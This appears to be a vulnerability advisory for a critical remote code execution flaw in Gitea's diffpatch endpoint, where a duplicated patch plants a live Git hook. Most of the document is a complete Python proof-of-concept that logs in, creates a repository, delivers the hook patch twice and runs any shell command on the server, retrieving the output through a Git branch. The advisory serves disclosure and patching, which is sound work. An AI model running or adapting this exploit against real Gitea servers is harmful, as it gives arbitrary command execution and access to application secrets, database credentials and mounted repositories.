# [C] Gitea: Remote Code Execution via diffpatch Git Hook Installation

## Summary
Severity: Critical
Advisory: GHSA-rcr6-4jqh-j84m
Aliases: BIT-gitea-2026-60004, CVE-2026-60004, GO-2026-6433
Ecosystem: Go
Published: 2026-09-08
Source: https://osv.dev/vulnerability/GHSA-rcr6-4jqh-j84m
Type: osv

## Affected
- Go: `gitea.dev` — affected >=1.17.0 <1.27.1

## Details
### Summary

Gitea's `diffpatch` endpoint can be abused to install and execute a Git hook from repository-controlled content.

An attacker with ordinary write access to a repository can execute arbitrary shell commands as the Gitea OS user. With default open registration, an unauthenticated visitor can obtain the required write access by registering an account and creating a repository.

### Details

`services/repository/files/patch.go` applies attacker-controlled patches in a shared bare temporary clone:

```go
cmdApply := gitcmd.NewCommand("apply", "--index", "--recount", "--cached", "--binary")
if git.DefaultFeatures().CheckVersionAtLeast("2.32") {
    cmdApply.AddArguments("-3")
}
````

Submitting the same patch twice creates an add/add collision. Git's three-way fallback checks the indexed path out even though the operation is performed with `--cached`.

In a bare clone, the repository root is `$GIT_DIR`. As a result, an executable entry named:

```text
hooks/post-index-change
```

becomes a live Git hook.

Git invokes the hook while writing the index, allowing repository-controlled content to execute arbitrary commands as the Gitea service account.

The hook's return value is not propagated to the `diffpatch` response.

The attached PoC stores command output in Git objects and creates a branch containing the result, so no outbound connection is required. The result is fetched through authenticated smart HTTP.

### PoC

The supplied `gitea_diffpatch_rce_poc.py` uses an existing Gitea account. Run it against a test instance where the account can create a repository.

Set the account password:

```bash
export GITEA_PASSWORD='account-password'
```

Execute a command through the `diffpatch` chain:

```bash
python3 ./gitea_diffpatch_rce_poc.py \
  https://gitea.example \
  pocuser \
  'id; uname -srm; pwd'
```

The script:

* Creates an initialized private repository.
* Submits the same executable-hook patch twice.
* Fetches the result branch.
* Prints the command's combined stdout, stderr, and exit status.
* Prints the evidence repository, ref, and commit IDs to stderr.

Expected output resembles:

```text
uid=1000(git) gid=1000(git) groups=1000(git)
Linux ...
/data/gitea/tmp/...

[exit-status=0]
```

The trigger requires:

* Git 2.32 or newer.
* An enabled `diffpatch` route.
* A writable and executable temporary filesystem.

Open registration is required only for the no-prior-credentials attack path.

### Impact

This is remote command execution as the Gitea service account (`CWE-94`).

Depending on deployment isolation and the privileges of the Gitea OS user, successful exploitation may expose:

* `app.ini` and Gitea application secrets.
* Process environment secrets.
* Mounted repositories.
* Database credentials and database contents.
* OAuth and integration credentials.
* Other internal or externally reachable services.

With open registration enabled, the attack can be performed by an unauthenticated visitor after registering a normal account and creating a repository.


<img width="928" height="687" alt="Screenshot 2026-07-25 at 14 45 44" src="https://github.com/user-attachments/assets/e7ce9fe7-bcab-4539-82fc-14c3856bda1c" />




```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Gitea RCE PoC – authorized testing only.
"""

from __future__ import annotations

import argparse
import base64
import getpass
import hashlib
import json
import os
from pathlib import Path

import secrets
import shlex
import shutil
import subprocess
import sys
import tempfile

from typing import Any
import urllib.error
import urllib.parse
import urllib.request


TIMEOUT    = 30.0
USER_AGENT = "gitea-rce-poc/2.0"

_RST  = "\033[0m"
_DIM  = "\033[2m"
_GRN  = "\033[38;5;46m"     # bright green
_RED  = "\033[31m"           # red for errors

def _g(t: str) -> str: return f"{_GRN}{t}{_RST}"
def _r(t: str) -> str: return f"{_RED}{t}{_RST}"
def _d(t: str) -> str: return f"{_DIM}{t}{_RST}"

def log_star(msg: str) -> None: print(f"{_g('[*]')} {_d(msg)}")
def log_ok  (msg: str) -> None: print(f"{_g('[+]')} {_g(msg)}")
def log_err (msg: str) -> None: print(f"{_r('[-]')} {_r(msg)}")


_SEP = "  " + "═" * 44
BANNER = f"{_SEP}\n  GITEA  REMOTE CODE EXECUTION  POC\n{_SEP}"

def print_banner(url: str, version: str | None = None,
                 command: str | None = None) -> None:
    print()
    for line in BANNER.splitlines():
        print(_g(line))
    print()
    ver = version or "unknown"
    print(_g("  " + "-" * 54))
    print(_g(f"  Target        : {url}"))
    print(_g(f"  Version       : {ver}"))
    if command:
        print(_g(f"  Command       : {command}"))
    print(_g("  " + "-" * 54))
    print()

class PocError(RuntimeError):
    pass

class GiteaClient:
    def __init__(self, base_url: str, username: str, password: str) -> None:
        parsed = urllib.parse.urlsplit(base_url)
        if parsed.scheme not in {"http", "https"} or not parsed.netloc:
            raise PocError("URL must be an absolute http:// or https:// URL")
        if parsed.query or parsed.fragment:
            raise PocError("URL must not contain a query string or fragment")
        self.base_url = base_url.rstrip("/")
        self.username = username
        self.password = password
        encoded = base64.b64encode(
            f"{username}:{password}".encode()
        ).decode("ascii")
        self.authorization = f"Basic {encoded}"

    def api(
        self,
        method: str,
        path: str,
        payload: dict[str, Any] | None = None,
    ) -> tuple[int, Any]:
        data = None
        if payload is not None:
            data = json.dumps(payload, separators=(",", ":")).encode()
        req = urllib.request.Request(
            self.base_url + path,
            data=data,
            method=method,
            headers={
                "Accept": "application/json",
                "Authorization": self.authorization,
                "Content-Type": "application/json",
                "User-Agent": USER_AGENT,
            },
        )
        try:
            with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
                raw = r.read()
                return r.status, json.loads(raw) if raw else None
        except urllib.error.HTTPError as exc:
            body = exc.read().decode("utf-8", errors="replace")[:2_000]
            raise PocError(f"{method} {path} → HTTP {exc.code}: {body}") from exc
        except urllib.error.URLError as exc:
            raise PocError(f"{method} {path} failed: {exc.reason}") from exc
        except json.JSONDecodeError:
            raise PocError(f"{method} {path} returned invalid JSON")

def blob_oid(content: bytes) -> str:
    return hashlib.sha1(
        f"blob {len(content)}\0".encode("ascii") + content
    ).hexdigest()

def build_hook(command: str, leak_ref: str) -> bytes:
    qcmd = shlex.quote(command)
    qref = shlex.quote(f"refs/heads/{leak_ref}")
    return (
        "#!/bin/sh\n"
        'git_dir=$(git rev-parse --absolute-git-dir) || exit 1\n'
        'origin_objects=$(sed -n "1p" "$git_dir/objects/info/alternates") || exit 2\n'
        'case "$origin_objects" in\n'
        '  /*) ;;\n'
        '  *) origin_objects="$git_dir/objects/$origin_objects" ;;\n'
        "esac\n"
        'origin_git=${origin_objects%/objects}\n'
        '[ "$origin_git" != "$origin_objects" ] || exit 3\n'
        f"output_blob=$({{ /bin/sh -c {qcmd}; "
        'command_status=$?; printf "\\n[exit-status=%s]\\n" "$command_status"; } 2>&1 | '
        'git --git-dir="$origin_git" hash-object -w --stdin) || exit 4\n'
        'tree=$(printf "100644 blob %s\\toutput\\n" "$output_blob" | '
        'git --git-dir="$origin_git" mktree) || exit 5\n'
        'commit=$(printf "command output\\n" | '
        "GIT_AUTHOR_NAME=poc GIT_AUTHOR_EMAIL=poc@example.invalid "
        "GIT_COMMITTER_NAME=poc GIT_COMMITTER_EMAIL=poc@example.invalid "
        'git --git-dir="$origin_git" commit-tree "$tree") || exit 6\n'
        f'git --git-dir="$origin_git" update-ref {qref} "$commit" || exit 7\n'
        "exit 0\n"
    ).encode()

def build_patch(hook: bytes) -> str:
    lc  = hook.count(b"\n")
    hdr = (
        "diff --git a/hooks/post-index-change b/hooks/post-index-change\n"
        "new file mode 100755\n"
        f"index {'0'*40}..{blob_oid(hook)}\n"
        "--- /dev/null\n"
        "+++ b/hooks/post-index-change\n"
        f"@@ -0,0 +1,{lc} @@\n"
    ).encode()
    return (hdr + b"".join(b"+" + l for l in hook.splitlines(keepends=True))).decode()

def run_git(git: str, arguments: list[str], env: dict[str, str]) -> bytes:
    try:
        result = subprocess.run(
            [git, *arguments], env=env,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            check=False, timeout=TIMEOUT,
        )
    except subprocess.TimeoutExpired as exc:
        raise PocError(f"git timed out after {TIMEOUT:g}s") from exc
    except OSError as exc:
        raise PocError(f"could not run git: {exc}") from exc
    if result.returncode != 0:
        err = result.stderr.decode("utf-8", errors="replace")[:2_000].strip()
        raise PocError(f"git exit {result.returncode}: {err}")
    return result.stdout

def fetch_output(git: str, client: GiteaClient,
                 owner: str, repo: str, leak_ref: str) -> bytes:
    remote = (
        f"{client.base_url}/"
        f"{urllib.parse.quote(owner, safe='')}/"
        f"{urllib.parse.quote(repo, safe='')}.git"
    )
    with tempfile.TemporaryDirectory(prefix="gitea-poc-") as tmp:
        bare      = Path(tmp) / "fetch.git"
        auth_cfg  = Path(tmp) / "auth.config"
        fd = os.open(auth_cfg, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
        with os.fdopen(fd, "w", encoding="utf-8") as f:
            f.write(f"[http]\n\textraHeader = Authorization: {client.authorization}\n")
        env = {**os.environ, "GIT_TERMINAL_PROMPT": "0"}
        run_git(git, ["init", "--bare", "--quiet", str(bare)], env)
        run_git(git, [
            "-C", str(bare), "-c", f"include.path={auth_cfg}",
            "fetch", "--quiet", "--no-tags",
            remote, f"refs/heads/{leak_ref}",
        ], env)
        return run_git(git, ["-C", str(bare), "show", "FETCH_HEAD:output"], env)

def split_output(raw: bytes) -> tuple[str, int | None]:
    text  = raw.decode("utf-8", errors="replace")
    lines = text.splitlines()
    status: int | None = None
    if lines:
        t = lines[-1].strip()
        if t.startswith("[exit-status=") and t.endswith("]"):
            try:    status = int(t[len("[exit-status="):-1])
            except ValueError: pass
            else:   lines.pop()
    return "\n".join(lines).rstrip("\n"), status


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Gitea RCE PoC")
    p.add_argument("url",      help="Gitea base URL")
    p.add_argument("username", help="existing Gitea username")
    p.add_argument("command",  help="shell command to execute on target")
    return p.parse_args()


def main() -> int:
    args = parse_args()
    if "\0" in args.command:
        raise PocError("command must not contain a NUL character")

    password = os.environ.get("GITEA_PASSWORD") or getpass.getpass(
        _g("[?]") + " password: "
    )
    if not password:
        raise PocError("password must not be empty")

    git = shutil.which("git")
    if git is None:
        raise PocError("git executable not found in PATH")

    client = GiteaClient(args.url, args.username, password)

    # version probe (pre-banner)
    log_star("probing target...")
    version: str | None = None
    try:
        r = urllib.request.Request(
            client.base_url + "/api/v1/version",
            headers={"Accept": "application/json", "User-Agent": USER_AGENT},
        )
        with urllib.request.urlopen(r, timeout=TIMEOUT) as resp:
            version = json.loads(resp.read()).get("version", "unknown")
    except Exception:
        version = "unknown"
    print_banner(client.base_url, version, args.command)

    log_star(f"target={client.base_url}  user={args.username}  cmd={args.command}")
    print()

    # step 1 – authenticate
    log_star("authenticating...")
    sc, acct = client.api("GET", "/api/v1/user")
    if sc != 200 or not isinstance(acct, dict):
        log_err("authentication failed"); raise PocError("auth failed")
    owner = acct.get("login")
    if not isinstance(owner, str) or not owner:
        log_err("no login in response"); raise PocError("no login")
    log_ok(f"logged in as {owner}  ({version})")

    # step 2 – create repo
    unique   = secrets.token_hex(5)
    repo     = f"test-repo-{unique}"
    leak_ref = f"output-{unique}"
    log_star("creating repository...")
    sc, _ = client.api("POST", "/api/v1/user/repos", {
        "name": repo, "private": True,
        "auto_init": True, "default_branch": "main",
        "object_format_name": "sha1",
    })
    if sc != 201:
        log_err("repo creation failed"); raise PocError("repo creation failed")
    log_ok(f"created repo {owner}/{repo}")

    # steps 3–4 – deliver payloads
    body = {
        "content": build_patch(build_hook(args.command, leak_ref)),
        "message": "initial commit",
        "branch": "main", "new_branch": "main",
    }
    ep = (
        f"/api/v1/repos/{urllib.parse.quote(owner, safe='')}/"
        f"{urllib.parse.quote(repo, safe='')}/diffpatch"
    )
    commits: list[str] = []
    for cycle in (1, 2):
        log_star(f"delivering payload {cycle}/2...")
        sc, resp = client.api("POST", ep, body)
        try:
            commit = resp["commit"]["sha"]
        except (KeyError, TypeError) as exc:
            log_err(f"payload {cycle}/2 rejected")
            raise PocError(f"cycle {cycle} no commit") from exc
        if sc != 201:
            log_err(f"payload {cycle}/2 failed")
            raise PocError(f"cycle {cycle} failed")
        commits.append(commit)
        log_ok(f"payload {cycle}/2 accepted  commit={commit[:16]}")

    # step 5 – retrieve output
    log_star("retrieving output...")
    output = fetch_output(git, client, owner, repo, leak_ref)
    log_ok("operation complete")

    # command output
    cmd_out, exit_status = split_output(output)
    print()
    log_ok(f"{args.command}:")
    print(_g("---"))
    if cmd_out:
        for line in cmd_out.splitlines():
            print(_g(line))
    else:
        print(_d("<no output>"))
    print(_g("---"))
    if exit_status == 0:
        log_ok(f"exit status: {exit_status}")
    elif exit_status is None:
        log_star("exit status: unknown")
    else:
        log_err(f"exit status: {exit_status}")

    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except PocError as exc:
        log_err(str(exc))
        raise SystemExit(1) from None

```

## References
- https://github.com/go-gitea/gitea/security/advisories/GHSA-rcr6-4jqh-j84m
- https://nvd.nist.gov/vuln/detail/CVE-2026-60004
- https://github.com/go-gitea/gitea/pull/38637
- https://github.com/go-gitea/gitea/pull/38638
- https://github.com/go-gitea/gitea/commit/470d34b1de87d901bd9135564d5ee18c0d339e82
- https://github.com/go-gitea/gitea/commit/d7bc52beeadff4be5f5690de4d5de42abd10affe
- https://blog.gitea.com/release-of-1.27.1
- https://github.com/0xBlackash/CVE-2026-60004
- https://github.com/go-gitea/gitea
- https://github.com/go-gitea/gitea/releases/tag/v1.27.1
- https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-60004
- https://www.runzero.com/blog/gitea
